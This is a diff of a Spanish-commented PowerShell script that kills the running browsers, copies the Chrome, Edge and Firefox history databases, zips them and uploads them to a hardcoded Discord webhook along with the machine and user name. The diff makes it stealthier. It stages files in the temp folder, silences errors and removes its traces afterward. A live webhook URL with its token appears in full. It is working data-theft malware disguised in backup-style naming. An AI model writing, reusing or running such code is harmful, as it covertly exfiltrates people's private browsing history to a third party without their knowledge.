@@ -1,29 +1,17 @@
-<#
-.SYNOPSIS
-Recolector modular de historiales de navegación con envío a Discord
-
-.DESCRIPTION
-Cierra navegadores, copia sus archivos de historial y envía los resultados a un webhook de Discord.
-
-.NOTES
-- Diseñado para expansión modular
-- Usa métodos no intrusivos
-- Requiere un webhook de Discord configurado
-#>
-
-# Configuración del Webhook de Discord
 $discordWebhookUrl = "https://discord.com/api/webhooks/1348379829598163038/BBTDV8jHgoMyF4sNPi2L_IyAZSsbmrtyuhE7VCAMiT0PVuTPTF-_OqDkWjPfDvC5YBkP"
 #tal vez no sea buena idea dejar esto aqui
+<#
+.SYNOPSIS
+Envía historiales de navegación como archivo ZIP adjunto a Discord
+
+.NOTES
+- Requiere PowerShell 5.1+
+- Compatible con Chrome, Edge y Firefox
+#>
+
 function Initialize-BackupEnvironment {
-    <#
-    .SYNOPSIS
-    Crea la carpeta de destino para los archivos de historial.
-    
-    .DESCRIPTION
-    Genera una carpeta con timestamp para almacenar los archivos de historial.
-    #>
     param(
-        [string]$BasePath = "$env:USERPROFILE\Documents\BrowserHistory"
+        [string]$BasePath = "$env:TEMP\BrowserHistory"
     )
 
     $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
@@ -37,145 +25,123 @@ function Initialize-BackupEnvironment {
 }
 
 function Close-Browsers {
-    <#
-    .SYNOPSIS
-    Cierra los navegadores especificados.
-    
-    .DESCRIPTION
-    Detiene los procesos de los navegadores para liberar los archivos de historial.
-    #>
     param(
         [string[]]$BrowserProcesses = @('chrome', 'msedge', 'firefox', 'msedgewebview2')
     )
-
-    Write-Host "Cerrando navegadores..." -ForegroundColor Yellow
     
     foreach ($process in $BrowserProcesses) {
         try {
             if (Get-Process $process -ErrorAction SilentlyContinue) {
-                Write-Verbose "Cerrando proceso: $process"
                 Stop-Process -Name $process -Force -ErrorAction Stop
-                Start-Sleep -Milliseconds 500  # Espera para liberación de archivos
+                Start-Sleep -Milliseconds 500
             }
         }
-        catch {
-            Write-Warning "No se pudo cerrar $process : $_"
-        }
+        catch {}
     }
 }
 
 function Backup-BrowserData {
-    <#
-    .SYNOPSIS
-    Copia los archivos de historial de un navegador específico.
-    
-    .DESCRIPTION
-    Realiza una copia del archivo de historial a la carpeta de destino.
-    #>
     param(
         [string]$TargetFolder,
         [string]$BrowserName,
-        [string]$ProcessName,
         [string]$SourcePath,
         [string]$FileName
     )
 
-    $result = [PSCustomObject]@{
-        Browser  = $BrowserName
-        Success  = $false
-        FilePath = $null
-        Error    = $null
-    }
-
     try {
-        if (-not (Test-Path $SourcePath)) {
-            throw "Archivo no encontrado"
+        if (Test-Path $SourcePath) {
+            $destPath = Join-Path $TargetFolder $FileName
+            Copy-Item -Path $SourcePath -Destination $destPath -Force
+            return $destPath
         }
-
-        $destPath = Join-Path $TargetFolder $FileName
-        Copy-Item -Path $SourcePath -Destination $destPath -Force
-        
-        $result.Success = $true
-        $result.FilePath = $destPath
     }
     catch {
-        $result.Error = $_
+        return $null
     }
-
-    return $result
 }
 
-function Send-ToDiscord {
-    <#
-    .SYNOPSIS
-    Envía un mensaje a un webhook de Discord.
-    
-    .DESCRIPTION
-    Envía un mensaje con formato JSON a un canal de Discord usando un webhook.
-    #>
+function Send-ZipToDiscord {
     param(
         [string]$WebhookUrl,
-        [string]$Message,
-        [string]$Username = "Historial Bot",
-        [string]$AvatarUrl = ""
+        [string]$ZipPath,
+        [string]$Message
     )
 
-    $body = @{
-        content = $Message
-        username = $Username
-        avatar_url = $AvatarUrl
-    } | ConvertTo-Json
-
     try {
-        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType "application/json"
+        $embed = @{
+            title = "Historial de navegación"
+            description = $Message
+            color = 16744272
+            timestamp = (Get-Date -Format "o")
+        }
+
+        $payload = @{
+            embeds = @($embed)
+        } | ConvertTo-Json -Depth 4
+
+        $form = @{
+            'payload_json' = $payload
+            'file' = Get-Item -Path $ZipPath
+        }
+
+        Invoke-RestMethod -Uri $WebhookUrl -Method Post `
+            -Form $form `
+            -ContentType 'multipart/form-data'
     }
     catch {
-        Write-Warning "Error enviando a Discord: $_"
+        Write-Host "Error enviando ZIP: $_" -ForegroundColor Red
     }
 }
 
 #------------------- EJECUCIÓN PRINCIPAL -------------------
-$targetFolder = Initialize-BackupEnvironment
-
-# 1. Cierre de navegadores (opcional, comentar si no se necesita)
-Close-Browsers
-
-# 2. Recolección de historiales
-$backupResults = @()
-
-# Chrome
-$backupResults += Backup-BrowserData -TargetFolder $targetFolder `
-    -BrowserName "Chrome" -ProcessName "chrome" `
-    -SourcePath "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" `
-    -FileName "chrome_history.db"
-
-# Microsoft Edge
-$backupResults += Backup-BrowserData -TargetFolder $targetFolder `
-    -BrowserName "Edge" -ProcessName "msedge" `
-    -SourcePath "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" `
-    -FileName "edge_history.db"
-
-# Firefox
-$firefoxPath = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" |
-               Select-Object -First 1 -ExpandProperty FullName
-
-$backupResults += Backup-BrowserData -TargetFolder $targetFolder `
-    -BrowserName "Firefox" -ProcessName "firefox" `
-    -SourcePath $firefoxPath `
-    -FileName "firefox_places.sqlite"
-
-# 3. Resultados
-$backupResults | Format-Table -AutoSize
-
-# 4. Enviar resultados a Discord
-$message = "Historiales recolectados:`n"
-$message += ($backupResults | ForEach-Object {
-    "$($_.Browser): $(if ($_.Success) {'exito'} else {'Error'}) - $($_.FilePath)"
-}) -join "`n"  # <-- Paréntesis críticos
-
 try {
-    Send-ToDiscord -WebhookUrl $discordWebhookUrl -Message $message
+    # Configuración inicial
+    $targetFolder = Initialize-BackupEnvironment
+    Close-Browsers
+
+    # Recolectar historiales
+    $files = @()
+    
+    # Chrome
+    $chromeFile = Backup-BrowserData -TargetFolder $targetFolder `
+        -BrowserName "Chrome" `
+        -SourcePath "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" `
+        -FileName "chrome_history.db"
+    if ($chromeFile) { $files += $chromeFile }
+
+    # Edge
+    $edgeFile = Backup-BrowserData -TargetFolder $targetFolder `
+        -BrowserName "Edge" `
+        -SourcePath "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" `
+        -FileName "edge_history.db"
+    if ($edgeFile) { $files += $edgeFile }
+
+    # Firefox
+    $firefoxPath = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" | 
+                   Select-Object -First 1 -ExpandProperty FullName
+    $firefoxFile = Backup-BrowserData -TargetFolder $targetFolder `
+        -BrowserName "Firefox" `
+        -SourcePath $firefoxPath `
+        -FileName "firefox_places.sqlite"
+    if ($firefoxFile) { $files += $firefoxFile }
+
+    # Crear ZIP
+    $zipPath = "$env:TEMP\historial_$(Get-Date -Format 'yyyyMMddHHmmss').zip"
+    Compress-Archive -Path $files -DestinationPath $zipPath -CompressionLevel Optimal -Force
+
+    # Enviar a Discord
+    if (Test-Path $zipPath) {
+        $computerName = $env:COMPUTERNAME
+        $userName = $env:USERNAME
+        Send-ZipToDiscord -WebhookUrl $discordWebhookUrl -ZipPath $zipPath `
+            -Message "Recolectado de $computerName ($userName)"
+    }
 }
 catch {
-    Write-Host "Error al enviar a Discord: $_" -ForegroundColor Red
+    Write-Host "Error general: $_" -ForegroundColor Red
+}
+finally {
+    # Limpieza
+    if ($targetFolder) { Remove-Item $targetFolder -Recurse -Force -ErrorAction SilentlyContinue }
+    if ($zipPath -and (Test-Path $zipPath)) { Remove-Item $zipPath -Force -ErrorAction SilentlyContinue }
 }
